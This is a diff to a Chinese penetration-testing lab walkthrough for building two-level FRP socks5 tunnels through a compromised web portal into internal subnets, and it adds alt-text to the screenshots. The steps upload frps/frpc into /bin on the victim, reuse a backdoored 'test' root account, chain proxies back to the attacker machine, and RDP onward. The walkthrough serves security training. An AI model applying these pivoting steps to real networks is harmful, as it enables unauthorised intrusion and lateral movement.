@@ -29,7 +29,7 @@ FRP（Fast Reverse Proxy）是一种轻量级、高性能的反向代理工具�
 
 ## 【实验拓扑】
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500546.png)
+![网络拓扑图：攻击机 Kali 67.220.91.30 与 Windows 67.220.91.68，经 NGFW 防火墙分出 DMZ 172.16.10.0/24、办公区 10.0.18.0/24、服务器区 10.0.20.0/24](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500546.png)
 
 ## 【实验预期】
 
@@ -44,11 +44,11 @@ FRP（Fast Reverse Proxy）是一种轻量级、高性能的反向代理工具�
 
 单击上方菜单栏中的【环境申请】按钮启动实验拓扑，选择拓扑图中左下方的【攻击机2-Windows】，按右键，在弹出的菜单中选择【控制台】，登录【攻击机2-Windows】界面。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500548.png)
+![同一张网络拓扑图，用于说明二级隧道的路径](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500548.png)
 
 依次双击打开桌面【工具】→【frp】文件夹。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500549.png)
+![frp 目录下的文件：frpc.exe、frps.exe、frpc.toml、LICENSE 等](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500549.png)
 
 #### （2）配置攻击机frp服务端
 
@@ -59,11 +59,11 @@ FRP（Fast Reverse Proxy）是一种轻量级、高性能的反向代理工具�
 server_port = 7000
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500550.png)
+![选中 frps.ini，记事本内容为 [common] server_port=7000（红框）](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500550.png)
 
 在【frp】此文件夹空白处，右键弹出菜单，单击选择【在此处打开命令提示符】。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500551.png)
+![右键菜单里选择「在此处打开命令提示符」](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500551.png)
 
 在命令提示符窗口中，输入以下命令，开启本地服务端代理监听7000端口。
 
@@ -71,7 +71,7 @@ server_port = 7000
 frps -c frps.ini
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500552.png)
+![执行 frps -c frps.ini，提示 frps started successfully](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500552.png)
 
 #### （2）上传frp并配置一级隧道frp的客户端
 
@@ -81,7 +81,7 @@ frps -c frps.ini
 scp frps frpc test@202.1.10.57:/bin
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500553.png)
+![scp 把 frps 与 frpc 上传到 test@202.1.10.57 的 /bin 目录，两个文件均 100%](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500553.png)
 
 > 注：由第六单元的6.2子任务，利用SUID方式提权添加test用户为root权限，密码为Com.1234。
 
@@ -91,7 +91,7 @@ scp frps frpc test@202.1.10.57:/bin
 ssh test@202.1.10.57
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500554.png)
+![ssh 登录 202.1.10.57，显示上次登录来源 67.220.91.30，已进入 root@centos7](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500554.png)
 
 输入以下命令并按下回车，使用chmod命令给予【frps】和【frpc】两个文件执行权限。
 
@@ -100,7 +100,7 @@ chmod +x frps
 chmod +x frpc
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500555.png)
+![chmod +x 给 /bin/frpc 与 /bin/frps 加执行权限](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500555.png)
 
 输入以下命令并按下回车键，使用vim命令创建并编辑tmp根目录下的frpc.ini客户端配置文件。
 
@@ -108,7 +108,7 @@ chmod +x frpc
 vim /tmp/frpc.ini
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500556.png)
+![vim 编辑 /tmp/frpc.ini](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500556.png)
 
 对frpc.ini文件进行编辑添加客户端的参数，按【i】键启用编辑模式，并输入以下配置参数，分别配置攻击机的IP与监听端口、配置本地socks5代理端口1080、配置给由本地10080端口转发至本地10088端口，再由本地10088端口转发到攻击机。
 
@@ -129,11 +129,11 @@ local_port = 10080
 remote_port = 10088
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500557.png)
+![frpc.ini 内容：[common] 指向 67.220.91.68:7000，[socks5-1] 用 remote_port 1080，[socks5-33] 映射本地 10080 到 10088](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500557.png)
 
 编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq】 命令并按下回车键，保存并退出文件编辑模式。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png)
+![vim 底部执行 :wq 保存退出](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png)
 
 #### （3）配置网站门户2的frp客户端
 
@@ -143,11 +143,11 @@ remote_port = 10088
 frpc -c /tmp/frpc.ini
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500559.png)
+![运行 frpc -c /tmp/frpc.ini，输出 login to server success 与 start proxy success](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500559.png)
 
 frps服务端开始响应，连接成功。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500560.png)
+![frps 服务端日志：客户端 202.1.10.57 登录，并为 socks5-33、socks5-1 建立 tcp 代理](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500560.png)
 
 ### 2.二级隧道代理
 
@@ -159,7 +159,7 @@ frps服务端开始响应，连接成功。
 vim /tmp/frps.ini
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500561.png)
+![vim 编辑 /tmp/frps.ini](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500561.png)
 
 对frpc.ini文件进行编辑添加客户端的参数，按【i】键启用编辑模式，并输入以下配置参数，配置本地服务端口7000。
 
@@ -168,15 +168,15 @@ vim /tmp/frps.ini
 bind_port = 7000
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500562.png)
+![frps.ini 内容为 [common] bind_port = 7000](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500562.png)
 
 编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq】 命令并按下回车键，保存并退出文件编辑模式。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png)
+![vim 底部执行 :wq 保存退出](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png)
 
 输入ifconfig命令并按回车，得知门户网站2内网IP地址为【172.16.10.183】。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500563.png)
+![ifconfig 输出，红框标出 eth0 的内网地址 172.16.10.183](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500563.png)
 
 输入以下命令并按下回车，在网站门户2中开启frp服务端程序。
 
@@ -184,7 +184,7 @@ bind_port = 7000
 frps -c /tmp/frps.ini
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500564.png)
+![在 172.16.10.183 上运行 frps -c /tmp/frps.ini，提示 frps started successfully](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500564.png)
 
 #### （2）配置网站门户1的frp二级隧道客户端
 
@@ -201,19 +201,19 @@ plugin = socks5
 remote_port = 10080  
 ```
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500565.png)
+![frpc.ini 改为指向 172.16.10.183:7000，[socks5-2] 的 remote_port 为 10080](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500565.png)
 
 双击打开桌面上的远程桌面，单击【连接】按钮，连接目标202.1.10.34服务器。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500566.png)
+![远程桌面连接窗口，计算机填 202.1.10.34，用户名 test](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500566.png)
 
 输入【test】的用户，密码为【Com.1234】。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500568.png)
+![Windows 安全中心要求输入 test 的凭据，密码已填写](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500568.png)
 
 等待连接。
 
-![](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500569.png)
+![正在连接到 202.1.10.34，进度条显示正在加密远程连接](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500569.png)
 
 进入远程桌面窗口，关闭服务器管理器窗口，复制【工具】文件夹的【frpc.exe】和【frpc.ini】两个文件到目标远程的桌面。
 
